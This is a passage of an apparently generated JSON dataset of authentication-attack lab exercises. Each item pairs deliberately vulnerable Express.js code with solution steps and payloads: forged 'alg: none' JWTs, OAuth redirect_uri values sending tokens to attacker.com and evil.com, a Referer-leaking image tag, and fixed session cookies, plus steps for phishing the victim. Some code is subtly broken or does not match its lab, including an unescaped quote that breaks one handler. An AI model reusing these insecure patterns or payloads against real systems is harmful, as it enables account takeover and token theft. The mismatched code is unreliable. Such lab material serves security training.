    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; if (redirect_uri.includes('http')) { const token = 'carlos-token-abc123'; return res.redirect(`${redirect_uri}#access_token=${token}`); } res.status(400).send('Invalid redirect URI'); }); app.get('/user-profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-token-abc123') return res.send('Profile: Carlos'); res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com",
      "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com/#access_token=",
      "Authorization: Bearer carlos-token-abc123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion leading to authentication bypass",
    "Lab Description": "The authentication mechanism uses JSON Web Tokens (JWTs) for session management. However, it fails to verify the signing algorithm properly, allowing an attacker to forge tokens by switching the algorithm to 'none'. The application accepts unsigned JWTs if the alg field is tampered. To solve: forge a valid token and access Carlos's account page without valid credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the login response and capture the JWT in the Set-Cookie header.",
      "2. Decode the JWT using jwt.io or Postman and analyze the alg field.",
      "3. Modify the alg value from HS256 to none and delete the signature part of the token.",
      "4. Change the payload sub field to 'carlos', re-encode the JWT without signing it.",
      "5. Replace the original JWT in the request cookies with the modified unsigned JWT and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'carlos123' }]; const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ sub: username }, SECRET, { algorithm: 'HS256' }); res.cookie('auth', token); res.send('Login successful'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; try { const decoded = jwt.verify(token, SECRET); res.send(`Account page of ${decoded.sub}`); } catch (err) { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Auth Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration",
    "Lab Description": "The lab uses OAuth 2.0's implicit flow to authorize users but fails to validate the redirect URI correctly. This enables an attacker to steal tokens by redirecting users to an attacker-controlled domain. To solve: harvest a valid access token and use it to impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the /authorize request using Burp Suite or OWASP ZAP.",
      "2. Modify the redirect_uri parameter to point to your malicious server (e.g., https://attacker.com/callback).",
      "3. Craft a phishing link containing the modified redirect_uri and trick Carlos into clicking it.",
      "4. Capture the access token from the fragment portion of the redirect URL sent to your server.",
      "5. Use the stolen token in the Authorization header (Bearer token) to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const crypto = require('crypto'); const users = [{ username: 'carlos', password: 'secure123', token: 'access_token_carlos' }]; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'token') { const token = 'access_token_carlos'; const uri = `${redirect_uri}#access_token=${token}&token_type=bearer`; res.redirect(uri); } else { res.status(400).send('Invalid response_type'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = users.find(u => u.token === token); if (user) res.send(`Welcome ${user.username}`); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Flow Lab at http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/authorize?client_id=123&redirect_uri=https://attacker.com/callback&response_type=token",
      "https://attacker.com/callback#access_token=access_token_carlos&token_type=bearer"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "The application issues session cookies before authentication and does not regenerate the session ID after login. An attacker can set a known session ID for a victim, then hijack the session post-login. To solve: fixate Carlos's session and use it after he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Using Postman or Burp Suite, initiate a session by sending a GET request to /login and note the Set-Cookie header.",
      "2. Share the fixed session ID with the victim (e.g., in a phishing email or malicious link).",
      "3. Wait for the victim to log in with the fixated session ID.",
      "4. Use the same session ID to access /my-account while impersonating Carlos.",
      "5. Confirm access to his account to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'mypassword' }]; app.get('/login', (req, res) => { let sid = req.cookies.sid || 'abc123'; sessions[sid] = {}; res.cookie('sid', sid); res.send('<form method=post action=/login><input name=username><input name=password><input type=submit></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Invalid login'); const sid = req.cookies.sid; sessions[sid] = { user: username }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] && sessions[sid].user) res.send(`Welcome ${sessions[sid].user}`); else res.send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: sid=abc123",
      "GET /login HTTP/1.1\nHost: vulnerable-app.com\nCookie: sid=abc123",
      "GET /my-account HTTP/1.1\nHost: vulnerable-app.com\nCookie: sid=abc123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion attack in stateless API authentication",
    "Lab Description": "This lab's stateless JWT-based authentication system is vulnerable to an algorithm confusion flaw. The server uses RS256 for verifying JWTs, but it accepts tokens signed with HS256 if manipulated correctly. The application blindly trusts the 'alg' field in the JWT header. To solve: forge a valid JWT that grants access to Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture a JWT issued to a valid user via login API.",
      "Decode the JWT using jwt.io or jwt-tool and analyze the header and payload for algorithm type and key fields.",
      "Change the algorithm from RS256 to HS256 and set the payload 'username' to 'carlos'.",
      "Use the public key as HMAC secret and sign the token using HS256 with jwt_tool or python-jose.",
      "Send the forged JWT via Authorization header to /my-account endpoint and verify access to Carlos's page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'user' }]; const pubKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, fs.readFileSync('./private.pem'), { algorithm: 'RS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey); if (decoded.username === 'carlos') res.send('Sensitive info for Carlos'); else res.send('Access denied'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "HS256 JWT with payload: {\"username\":\"carlos\"}, signed using RS public key",
      "Modified header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "Signed using HMAC with public key as secret"
    ]
  },
  {
    "Lab scenario": "Session fixation in classic web login flow",
    "Lab Description": "The application fails to invalidate the user's session upon successful login, making it vulnerable to session fixation. The attacker can set a session identifier before the victim logs in, and the application continues using the same session after authentication. To solve: Fix a session ID, trick Carlos to log in, and then use the session ID to access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to initiate a session with GET /login and capture the Set-Cookie header.",
      "Send the session cookie to Carlos via social engineering or simulate login with known credentials using the fixed session ID.",
      "Ensure that the application does not issue a new session ID post-login by observing response cookies.",
      "Reuse the fixed session ID and send a request to /my-account with the session cookie set.",
      "Verify access to Carlos's account page using the same session identifier."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.setHeader('Set-Cookie', 'session=' + sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid] = { authenticated: true, username }; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session]; if (session?.authenticated && session.username === 'carlos') { res.send('Carlos's account'); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "Fixed session ID like 'attacker123' set via Set-Cookie header",
      "Crafted POST /login request with known user credentials and fixed session cookie",
      "GET /my-account with same session ID reused after victim login"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaking tokens via redirect",
    "Lab Description": "The OAuth implementation of this app leaks access tokens via an open redirect vulnerability after authorization. The redirect_uri parameter is not properly validated, allowing attackers to capture tokens sent via URL fragments. To solve: Trick the authorization server into sending Carlos's token to your controlled endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start OAuth authorization flow with Burp and intercept the GET /authorize request.",
      "Modify the redirect_uri parameter to an attacker-controlled domain or path (e.g., https://attacker.com/callback).",
      "Trick Carlos into authorizing the app by sending the crafted link.",
      "Capture the access token in the redirect fragment sent to your endpoint (e.g., #access_token=abc123).",
      "Use the stolen token in the Authorization header to access the protected /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/authorize', (req, res) => { const { redirect_uri, user } = req.query; const token = 'token_' + Math.random().toString(36).substring(2); tokens[user] = token; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; const user = Object.keys(tokens).find(u => `Bearer ${tokens[u]}` === auth); if (user === 'carlos') res.send('Carlos account data'); else res.status(401).send('Unauthorized'); }); app.listen(8080);",
    "payloads": [
      "Modified redirect_uri=https://attacker.com/callback",
      "OAuth URL: /authorize?redirect_uri=https://attacker.com/callback&user=carlos",
      "Authorization header: Bearer token_xxxxxx"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in login authentication",
    "Lab Description": "The application uses JWTs to manage user sessions. However, it improperly trusts the 'alg' field from user-supplied tokens without validating the signature. The application accepts tokens where 'alg' is set to 'none'. To solve: forge a valid token for the admin user and access the protected admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to capture the POST /login request and extract the JWT from the Set-Cookie header.",
      "2. Decode the JWT at jwt.io and observe the header and payload fields.",
      "3. Modify the header to use 'alg':'none' and change the payload to 'username':'admin'.",
      "4. Remove the signature part entirely and send the modified JWT in the Cookie header using Postman or Burp.",
      "5. Access /admin-dashboard and verify admin privileges."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.cookie('session', token).send('Logged in'); }); app.get('/admin-dashboard', (req, res) => { const token = req.cookies.session; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'admin') { return res.send('Welcome admin!'); } res.send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{ \"alg\": \"none\" }.{ \"username\": \"admin\" }."
    ]
  },
  {
    "Lab scenario": "Open redirect flaw in OAuth redirect_uri parameter",
    "Lab Description": "This lab implements OAuth login flow using a third-party provider. The `redirect_uri` parameter is improperly validated, allowing redirection to arbitrary domains. To solve: intercept the OAuth flow and steal an access token via redirection to a malicious endpoint under your control.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Initiate the login with OAuth from the target app and intercept the initial authorization URL using Burp Suite.",
      "2. Modify the 'redirect_uri' parameter to redirect to your malicious host (e.g., https://evil.com/callback).",
      "3. Host a listener or server on https://evil.com to capture the incoming request with the access_token.",
      "4. Complete the flow and monitor your server logs for the leaked token.",
      "5. Replay the token in an authenticated API request using Postman to retrieve the user profile and access restricted data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}?access_token=1234567890abcdef`); }); app.get('/profile', (req, res) => { const { access_token } = req.query; if (access_token === '1234567890abcdef') return res.send('User profile: admin'); res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirection Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://evil.com/callback",
      "https://malicious.site/steal?access_token=1234567890abcdef",
      "redirect_uri=https://attacker.com/receive"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in authentication process",
    "Lab Description": "The login endpoint does not issue a new session identifier after successful authentication. This allows an attacker to fix a session ID before login and hijack the user session afterward. To solve: fix a session ID, get the victim to log in using it, then access their account using the same session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to visit the site and note the session cookie issued before login (e.g., session=abcd1234).",
      "2. Send this session ID to the victim and entice them to log in while using it (via a phishing link or XSS vector).",
      "3. Once the victim logs in with the fixed session ID, reuse it to access /my-account.",
      "4. Verify you now have access to their authenticated session.",
      "5. Visit /my-account while reusing the session cookie and confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'victim', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const session = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[session] = username; return res.send('Login successful'); } res.status(401).send('Login failed'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; const user = sessions[session]; if (user) return res.send(`Account page for ${user}`); res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "session=abcd1234",
      "GET /login with predefined cookie",
      "Cookie: session=abcd1234"
    ]
  },
  {
    "Lab scenario": "Session fixation via MFA token reuse in REST login flow",
    "Lab Description": "The application uses a RESTful login flow with 2FA implemented through a token verification endpoint. However, the token is bound to the session in an insecure way. The application reuses the 2FA token without revalidating the session context, allowing an attacker to hijack a victim's session post-authentication. To solve: Fixate your session during pre-authentication and inject a valid 2FA token generated by the victim to gain access to their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite's Proxy to log in with your own credentials and intercept the POST /api/generate-2fa-token request.",
      "Send the 2FA generation request to Repeater, change the 'username' field to 'carlos' and capture the valid token.",
      "Start a new session using incognito mode and intercept the pre-login request to POST /api/session.",
      "Send the session cookie along with the stolen 2FA token to the POST /api/verify-2fa endpoint.",
      "Upon successful response, access /api/user-profile using the fixed session to verify account takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const sessions = {}; const tokens = {}; app.use(bodyParser.json()); app.post('/api/session', (req, res) => { const sid = 'sess_' + Date.now(); sessions[sid] = { authenticated: false }; res.cookie('session', sid).json({ sid }); }); app.post('/api/generate-2fa-token', (req, res) => { const { username } = req.body; tokens[username] = '112233'; res.json({ message: 'Token sent' }); }); app.post('/api/verify-2fa', (req, res) => { const sid = req.cookies.session; const { username, token } = req.body; if (tokens[username] === token) { sessions[sid].authenticated = true; sessions[sid].user = username; return res.json({ success: true }); } res.status(403).json({ error: 'Invalid token' }); }); app.get('/api/user-profile', (req, res) => { const sid = req.cookies.session; if (sessions[sid]?.authenticated) return res.send('Welcome ' + sessions[sid].user); res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "{\"username\":\"carlos\"}",
      "{\"username\":\"carlos\",\"token\":\"112233\"}"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token theft via redirect URI manipulation",
    "Lab Description": "The application integrates with a third-party OAuth provider using the implicit flow, but does not properly validate redirect URIs. This allows an attacker to inject a malicious redirection target and capture the access token from the URL fragment. To solve: Exploit the OAuth flow to extract Carlos’s access token and use it to access his private user dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open the login link to the OAuth provider and intercept the OAuth authorization request.",
      "Modify the redirect_uri parameter to point to your own server or Burp Collaborator.",
      "Trigger the OAuth login flow using Carlos’s session (use session fixation or phishing).",
      "Capture the access token leaked in the URL fragment via your redirect URI endpoint.",
      "Replay the token in the Authorization header to access the victim's /dashboard endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const tokenCache = {}; app.use(bodyParser.urlencoded({ extended: true })); app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; const token = Buffer.from(user + ':token123').toString('base64'); tokenCache[user] = token; res.redirect(redirect_uri + '#access_token=' + token); }); app.get('/dashboard', (req, res) => { const auth = req.headers['authorization']; const token = auth?.split(' ')[1]; const decoded = Buffer.from(token, 'base64').toString(); const username = decoded.split(':')[0]; if (tokenCache[username] === token) return res.send('Dashboard for ' + username); res.status(403).send('Access denied'); }); app.listen(4001);",
    "payloads": [
      "https://malicious.example.com/#access_token=carlos:token123",
      "Authorization: Bearer Y2FybG9zOnRva2VuMTIz"
    ]
  },
  {
    "Lab scenario": "JWT signature validation bypass using 'none' algorithm",
    "Lab Description": "The application uses JWT for session management. However, it incorrectly accepts tokens with the 'alg':'none' header and skips signature verification. An attacker can forge a token and impersonate any user. To solve: Create a tampered token that impersonates the admin user and access the protected admin panel.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to send a GET /jwt-login request and extract your valid JWT.",
      "Decode the JWT using jwt.io or Burp Decoder and note the structure.",
      "Craft a new token with header: {\"alg\":\"none\"}, and payload: {\"user\":\"admin\"}. Remove the signature.",
      "Send the forged token in Authorization: Bearer header to /admin-dashboard.",
      "Confirm admin access and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.get('/jwt-login', (req, res) => { const token = jwt.sign({ user: 'guest' }, secret); res.send({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.user === 'admin') return res.send('Welcome Admin'); res.status(403).send('Not authorized'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4002);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
  }
,



    {
    "Lab scenario": "Session fixation via cookie injection",
    "Lab Description": "This lab demonstrates session fixation in the authentication process. The application assigns session IDs before authentication and fails to invalidate them post-login. The application reuses existing session cookies instead of issuing new ones after login. To solve: Fixate a valid session ID before login and hijack Carlos's authenticated session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite Proxy to capture a pre-login request to /login and observe the Set-Cookie header containing the session ID.",
      "Send the pre-login request to Burp Repeater and extract the session cookie.",
      "Log in to your own account using the session cookie to verify the session fixation behavior.",
      "Send a crafted phishing link to Carlos with the fixed session ID in a Set-Cookie header using OWASP ZAP or a controlled web page.",
      "Once Carlos logs in with the attacker-defined session, reuse the fixed session ID to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'secret123' }; app.get('/login', (req, res) => { if (!req.cookies.sessionID) { const sid = Math.random().toString(36).substring(7); res.cookie('sessionID', sid); sessions[sid] = null; } res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionID] = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionID]; if (user) { res.send(`Welcome back, ${user}`); } else { res.send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "Set-Cookie: sessionID=attackerSession",
      "GET /login HTTP/1.1 with injected sessionID",
      "Login link: http://victimsite/login with pre-set cookie sessionID=attackerSession",
      "GET /my-account with sessionID=attackerSession"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion with none header",
    "Lab Description": "This lab's JWT validation mechanism trusts the 'alg' header from incoming tokens. The application accepts unsigned tokens if the alg is set to 'none'. To solve: Forge a JWT token with alg: none and impersonate the user Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a valid login and observe the JWT in the Authorization header.",
      "Decode the JWT using jwt.io and identify the algorithm used in the header, typically 'HS256'.",
      "Modify the JWT to set alg: none and change the payload to {\"username\":\"carlos\"}.",
      "Remove the signature part and reconstruct the token with only header and payload.",
      "Use the forged token in the Authorization header and request /my-account to confirm impersonation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; const users = { carlos: 'secret123' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(403).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${payload.username}`); } catch (err) { res.status(403).send('Access denied'); } }); app.listen(4001);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer [unsigned JWT]",
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via referer header",
    "Lab Description": "The application exposes access tokens via the Referer header due to improper redirection. Tokens are embedded in URLs and leak during third-party image or script loads. To solve: Capture Carlos's access token from the Referer header and use it to access his account via the OAuth /userinfo endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Login and inspect a successful OAuth redirect to see the access_token in the URL fragment.",
      "Embed a third-party image (e.g., <img src=\"http://attacker.com/log\">) in your profile bio field and save.",
      "Wait for Carlos to visit your profile, leaking his Referer to your server which includes the token.",
      "Retrieve the access token from server logs and replay it via Postman to the /userinfo endpoint.",
      "Use the returned JSON data to confirm Carlos’s identity and mark the lab as solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const tokens = { carlos: 'abc123token' }; const profiles = {}; app.post('/update-profile', (req, res) => { const { username, bio } = req.body; profiles[username] = { bio }; res.send('Profile updated'); }); app.get('/profile/:user', (req, res) => { const user = req.params.user; if (profiles[user]) { res.send(`<div>${profiles[user].bio}</div>`); } else { res.send('No profile'); } }); app.get('/userinfo', (req, res) => { const token = req.query.access_token; const user = Object.keys(tokens).find(u => tokens[u] === token); if (user) { res.json({ user }); } else { res.status(403).json({ error: 'Invalid token' }); } }); app.listen(4002);",
    "payloads": [
      "<img src=\"http://attacker.com/log\">",
      "OAuth redirect URL with access_token in fragment",
      "GET /userinfo?access_token=abc123token",
      "Referer: http://victim.com/callback#access_token=abc123token"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Pre-Auth Token in Login Flow",
    "Lab Description": "This application fails to invalidate session tokens on login. An attacker can fix a session ID prior to authentication and hijack the victim’s session post-login. The application sets a session ID before verifying credentials but does not regenerate it. To solve: hijack Carlos’s session after login using a pre-fixed session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /login using Burp Suite and capture the Set-Cookie header with the session token.",
      "Use Burp Repeater to manually log in as Carlos using valid credentials, but send the captured session cookie in the request header.",
      "Verify that the session ID is not changed after successful login.",
      "Craft a phishing scenario or use social engineering to trick Carlos into logging in using the attacker’s fixed session cookie.",
      "After login, use the fixed session ID to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'fixationSecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') res.send('Account details for carlos'); else res.send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "GET /login -> capture session ID",
      "POST /login with fixed session cookie",
      "GET /my-account with session ID set to fixed value"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Tampering in Authorization Header",
    "Lab Description": "This lab uses JWTs for access control but improperly validates the signature algorithm. The server does not enforce signed JWTs when the 'alg' header is set to 'none'. To solve: forge a token impersonating Carlos and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the Authorization header after login as your own account.",
      "Decode the JWT using jwt.io or Burp Decoder and analyze the payload.",
      "Replace the 'alg' field in the JWT header with 'none' and remove the signature section entirely.",
      "Change the username in the payload to 'carlos' and re-encode the JWT (Base64Url).",
      "Send the modified token in the Authorization header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; const users = [{ username: 'carlos' }, { username: 'wiener' }]; app.get('/login', (req, res) => { const user = users.find(u => u.username === req.query.user); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ user: user.username }, secret); res.send({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.sendStatus(401); const payload = jwt.decode(token); if (payload.user === 'carlos') return res.send('Account details for carlos'); res.send('Access denied'); }); app.listen(3000);",
    "payloads": [
      "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"user\":\"carlos\"}",
      "Authorization: Bearer <header>.<payload>.",
      "GET /my-account"
    ]
  },
  {
    "Lab scenario": "OAuth2 Redirect URI Manipulation in Authorization Code Flow",
    "Lab Description": "The application integrates with an OAuth provider but fails to properly validate redirect URIs during the authorization code exchange. An attacker can manipulate this to steal authorization codes. To solve: steal Carlos’s OAuth token and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Burp to analyze the OAuth flow from login initiation to redirect with code.",
      "Register a malicious domain (or use a request bin) and set it as the redirect_uri parameter.",
      "Send the manipulated OAuth login URL to Carlos via phishing or other delivery.",
      "Capture the redirected authorization code from Carlos’s session.",
      "Exchange the stolen code for an access token and use it to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/auth/callback', async (req, res) => { const code = req.query.code; const tokenResp = await axios.post('https://oauth.example.com/token', { code }); const token = tokenResp.data.access_token; const userInfo = await axios.get('https://oauth.example.com/userinfo', { headers: { Authorization: `Bearer ${token}` } }); if (userInfo.data.username === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(3000);",
    "payloads": [
      "https://oauth.example.com/auth?client_id=app123&redirect_uri=https://attacker.com/callback&response_type=code",
      "Capture redirected code from attacker.com",
      "POST to token endpoint with stolen code",
      "GET /my-account with Authorization: Bearer <token>"
    ]
  },
  {
    "Lab scenario": "GraphQL session fixation via login mutation",
    "Lab Description": "The application's GraphQL login mutation allows session fixation due to improper session regeneration. Upon successful authentication, the application does not invalidate the existing session ID, enabling attackers to predetermine a victim’s session. To solve: Hijack Carlos's session by setting a known session cookie prior to login and reuse it to access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using Burp Suite, intercept your own GraphQL login mutation and observe that the session cookie is preserved post-login.",
      "2.In Burp Repeater, craft a login mutation using Carlos’s credentials and send it with a manually chosen session ID in the cookie header (e.g., session=attacker123).",
      "3.Confirm the response logs in Carlos and the session remains attacker123.",
      "4.Use the attacker123 cookie in a new request to /my-account and confirm it now grants access to Carlos’s account.",
      "5.Access /my-account with session=attacker123 to solve the lab."
    ],
    "Vulnerability name": "Authentication",
